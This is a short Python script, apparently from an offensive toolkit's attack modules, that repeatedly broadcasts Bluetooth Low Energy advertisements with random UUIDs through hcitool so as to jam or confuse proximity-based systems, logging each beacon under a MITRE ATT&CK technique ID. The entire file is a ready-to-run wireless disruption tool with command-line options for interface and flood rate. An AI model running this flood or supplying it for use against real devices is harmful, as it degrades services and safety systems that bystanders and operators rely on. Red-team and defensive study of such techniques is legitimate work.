#!/usr/bin/env python3
# modules/attacks/blind_spot_beacon_jammer.py

import random
import time
import argparse
import subprocess
import os
import json
from datetime import datetime

LOG_FILE = "results/blind_spot_jammer_log.json"
MITRE_TTP = "T1422"

def log_beacon(uuid):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "uuid": uuid,
            "ttp": MITRE_TTP
        }) + "\n")

def generate_random_uuid():
    return '-'.join([
        ''.join(random.choices("0123456789ABCDEF", k=8)),
        ''.join(random.choices("0123456789ABCDEF", k=4)),
        ''.join(random.choices("0123456789ABCDEF", k=4)),
        ''.join(random.choices("0123456789ABCDEF", k=4)),
        ''.join(random.choices("0123456789ABCDEF", k=12))
    ])

def start_ble_flood(interface, interval):
    print(f"[*] Starting BLE beacon flood on {interface}...")
    try:
        while True:
            uuid = generate_random_uuid()
            cmd = [
                "hcitool", "-i", interface, "cmd", "0x08", "0x0008",
                uuid.replace('-', '')
            ]
            subprocess.run(cmd, stdout=subprocess.DEVNULL)
            log_beacon(uuid)
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
    except Exception as e:
        print(f"[!] BLE flood failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Create BLE beacon noise to disrupt proximity-based systems")
    parser.add_argument("--interface", default="hci0", help="BLE interface (default: hci0)")
    parser.add_argument("--interval", type=float, default=0.2, help="Flood interval in seconds")
    args = parser.parse_args()
    start_ble_flood(args.interface, args.interval)
